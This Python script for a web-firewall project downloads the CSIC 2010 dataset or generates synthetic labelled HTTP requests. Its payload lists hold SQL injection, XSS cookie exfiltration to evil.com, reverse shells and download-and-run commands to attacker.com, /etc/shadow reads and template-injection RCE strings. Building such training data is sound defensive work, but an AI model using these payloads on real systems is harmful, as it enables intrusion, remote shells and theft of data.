"""
TransWAF - Dataset Download & Setup Instructions
Provides download links and automated synthetic data generation
so the pipeline works immediately without waiting for dataset approval.
"""
import os
import sys
import json
import random
import pandas as pd
from pathlib import Path

# Project root
ROOT = Path(__file__).parent.parent

RAW_DIR = ROOT / "data" / "raw"
RAW_DIR.mkdir(parents=True, exist_ok=True)

# ─────────────────────────────────────────────────────────────
# CSIC 2010 HTTP Dataset
# ─────────────────────────────────────────────────────────────
CSIC_INFO = """
╔══════════════════════════════════════════════════════════════╗
║          CSIC 2010 HTTP Dataset — Download Instructions      ║
╚══════════════════════════════════════════════════════════════╝

The CSIC 2010 dataset is publicly available. Follow these steps:

1. Visit: https://www.isi.csic.es/dataset/
   OR download directly from Kaggle:
   https://www.kaggle.com/datasets/deeplearning/csic-webappattacks

2. Download "CSIC_2010_HTTP_Dataset.zip"

3. Extract the contents to:
   {raw_dir}

   You should have files like:
     - normalTrafficTraining.txt
     - normalTrafficTest.txt
     - anomalousTrafficTest.txt

4. Then run: python data/preprocess.py

───────────────────────────────────────────────────────────────
ALTERNATIVE: If you don't have the dataset yet, run this script
with --synthetic flag to generate a synthetic training dataset
that is structurally identical for pipeline development/testing:

  python data/download_csic.py --synthetic
───────────────────────────────────────────────────────────────
"""


# ─────────────────────────────────────────────────────────────
# Comprehensive Synthetic Dataset Generator
# Generates realistic HTTP payloads for each attack category
# ─────────────────────────────────────────────────────────────

BENIGN_TEMPLATES = [
    "GET /api/products?category={cat}&page={page}&sort=price HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: application/json\r\n\r\n",
    "GET /search?q={word}&lang=en HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\nCookie: session={sid}\r\n\r\n",
    "POST /api/login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\nContent-Length: 42\r\n\r\n{{\"username\":\"{user}\",\"password\":\"{pwd}\"}}",
    "GET /images/{img}.jpg HTTP/1.1\r\nHost: cdn.example.com\r\nReferer: https://example.com/\r\n\r\n",
    "POST /api/users/{uid}/update HTTP/1.1\r\nHost: api.example.com\r\nContent-Type: application/json\r\n\r\n{{\"name\":\"{name}\",\"email\":\"{email}\"}}",
    "GET /news/article/{slug} HTTP/1.1\r\nHost: news.example.com\r\nAccept: text/html\r\n\r\n",
    "GET /api/v2/orders?status=pending&user_id={uid} HTTP/1.1\r\nHost: api.example.com\r\nAuthorization: Bearer {token}\r\n\r\n",
    "GET /favicon.ico HTTP/1.1\r\nHost: example.com\r\n\r\n",
    "POST /contact HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nname={name}&email={email}&message=Hello+World",
    "GET /api/categories HTTP/1.1\r\nHost: example.com\r\nAccept: application/json\r\n\r\n",
]

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "1' UNION SELECT null,username,password FROM users--",
    "1'; DROP TABLE users--", "' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
    "admin'--", "1 OR 1=1", "' UNION ALL SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(5)--", "'; EXEC xp_cmdshell('dir')--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "1 UNION SELECT user(),database(),version()--",
    "' OR 'x'='x", "1'; INSERT INTO users VALUES('hacker','hacked')--",
    "%27 OR %271%27=%271", "1%27+OR+1%3D1--",
    "' OR 1=1 LIMIT 1--", "admin' #", "1 AND 1=1",
    "1+UNION+SELECT+null%2Cpassword+FROM+users--",
    "' OR ''='", "x' AND email IS NULL; --",
    "' UNION SELECT *, NULL FROM users--",
    "1; SELECT * FROM users WHERE '1'='1",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "\"><script>alert(document.cookie)</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "'-alert(1)-'",
    "<input type=text value='' onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<img src='x' onerror='this.src=\"http://evil.com/?c=\"+document.cookie'>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<script>document.write('<img src=http://evil.com/'+document.cookie+'>')</script>",
    "<a href='javascript:alert(1)'>click me</a>",
    "<%00script>alert('XSS')</%00script>",
    "<scr\x00ipt>alert('XSS')</scr\x00ipt>",
    "&lt;script&gt;alert('xss')&lt;/script&gt;",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
    "xss\"><img src=/ onerror=alert(2)>",
]

CMDI_PAYLOADS = [
    "; ls -la", "| whoami", "&& cat /etc/passwd",
    "; cat /etc/shadow", "| id", "`id`",
    "$(id)", "; ping -c 4 attacker.com",
    "| nc attacker.com 4444 -e /bin/bash",
    "; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
    "| curl http://attacker.com/$(whoami)",
    "; python3 -c 'import socket;s=socket.socket();s.connect((\"attacker.com\",4444));import os;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\"/bin/sh\")'",
    "1 && dir", "& ipconfig", "| net user",
    "; rm -rf /tmp/*", "$(cat /etc/passwd)",
    "| type C:\\Windows\\win.ini", "; systeminfo",
    "& echo test > /tmp/pwned", "| nslookup attacker.com",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "../../../../etc/shadow", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd", "%252e%252e%252fetc%252fpasswd",
    "....//....//etc/passwd", "../etc/passwd%00.jpg",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    "/var/www/../../etc/passwd",
    "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "../../boot.ini", "../../../proc/self/environ",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "file:///etc/passwd", "/etc/passwd%00",
    "../////etc/////passwd", "../../../../../../../../../../etc/passwd",
]

RCE_PAYLOADS = [
    "${7*7}", "{{7*7}}", "<% Runtime.getRuntime().exec('id') %>",
    "eval(compile('import os; os.system(\"id\")', 'string', 'exec'))",
    "system('id')", "<?php system($_GET['cmd']); ?>",
    "`php -r 'system(\"id\");'`",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    ";assert(system('id'));",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "[[${7*7}]]", "#{7*7}", "*{7*7}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
    "java.lang.Runtime.exec('id')",
    "<?php passthru('cat /etc/passwd'); ?>",
    "eval(base64_decode('c3lzdGVtKCdpZCcp'));",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "exec('import os; os.system(\"calc.exe\")')",
]


WORDS = ["books", "electronics", "clothing", "shoes", "games", "music", "movies"]
CATS = ["laptop", "phone", "tablet", "watch", "camera"]
NAMES = ["john_doe", "jane_smith", "bob_jones", "alice_miller"]
EMAILS = ["user@example.com", "admin@test.org", "info@site.net"]
SLUGS = ["hello-world", "getting-started", "top-10-tips", "breaking-news"]


def random_benign():
    t = random.choice(BENIGN_TEMPLATES)
    return t.format(
        cat=random.choice(CATS), page=random.randint(1, 50),
        word=random.choice(WORDS), sid=os.urandom(8).hex(),
        user=random.choice(NAMES), pwd=os.urandom(4).hex(),
        img=f"img_{random.randint(1000,9999)}",
        uid=random.randint(100, 9999), name=random.choice(NAMES),
        email=random.choice(EMAILS), token=os.urandom(16).hex(),
        slug=random.choice(SLUGS),
    )


def embed_payload(payload: str, attack_type: str) -> str:
    """Embed a payload into a realistic HTTP request structure."""
    method = random.choice(["GET", "POST"])
    endpoints = {
        "sqli": ["/search?q={}", "/user?id={}", "/products?filter={}", "/api/items?name={}"],
        "xss": ["/search?q={}", "/comment?text={}", "/feedback?msg={}", "/profile?bio={}"],
        "cmdi": ["/api/ping?host={}", "/tools/lookup?domain={}", "/exec?cmd={}", "/admin/run?input={}"],
        "path_traversal": ["/download?file={}", "/assets?path={}", "/view?doc={}", "/image?src={}"],
        "rce": ["/template?expr={}", "/eval?code={}", "/calc?formula={}", "/api/process?data={}"],
    }
    endpoint_template = random.choice(endpoints.get(attack_type, ["/api/data?input={}"]))

    if method == "GET":
        path = endpoint_template.format(payload.replace(" ", "+"))
        return (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: target.example.com\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: text/html,application/json\r\n\r\n"
        )
    else:
        body = f"input={payload}&submit=1"
        return (
            f"POST {endpoint_template.format('data')} HTTP/1.1\r\n"
            f"Host: target.example.com\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n\r\n{body}"
        )


def generate_synthetic_dataset(n_per_class: int = 3000) -> pd.DataFrame:
    """Generate a balanced synthetic WAF dataset."""
    records = []

    payload_map = {
        "sqli": SQLI_PAYLOADS,
        "xss": XSS_PAYLOADS,
        "cmdi": CMDI_PAYLOADS,
        "path_traversal": PATH_TRAVERSAL_PAYLOADS,
        "rce": RCE_PAYLOADS,
    }

    print(f"[+] Generating {n_per_class} benign samples...")
    for _ in range(n_per_class):
        records.append({"request": random_benign(), "label": "benign"})

    for attack, payloads in payload_map.items():
        print(f"[+] Generating {n_per_class} {attack} samples...")
        for _ in range(n_per_class):
            base = random.choice(payloads)
            records.append({"request": embed_payload(base, attack), "label": attack})

    df = pd.DataFrame(records)
    df = df.sample(frac=1, random_state=42).reset_index(drop=True)
    print(f"[+] Total synthetic samples: {len(df)}")
    return df


def main():
    import argparse
    parser = argparse.ArgumentParser(description="TransWAF Dataset Setup")
    parser.add_argument("--synthetic", action="store_true",
                        help="Generate synthetic dataset instead of using CSIC 2010")
    parser.add_argument("--n", type=int, default=3000,
                        help="Number of samples per class for synthetic dataset (default: 3000)")
    args = parser.parse_args()

    if args.synthetic:
        print("\n[TransWAF] Generating synthetic training dataset...")
        df = generate_synthetic_dataset(n_per_class=args.n)
        # Write as Parquet — a binary format that is 100% immune to Windows
        # text-encoding and newline corruption issues.
        out_path = RAW_DIR / "synthetic_dataset.parquet"
        df.to_parquet(out_path, engine="pyarrow", index=False)

        if out_path.exists():
            print(f"[+] Saved to: {out_path}  ({out_path.stat().st_size:,} bytes)")
        else:
            print(f"[!] ERROR: File not created at {out_path}")
            sys.exit(1)
        print("[+] Now run: python data/preprocess.py --source synthetic")
    else:
        print(CSIC_INFO.format(raw_dir=RAW_DIR))


if __name__ == "__main__":
    main()
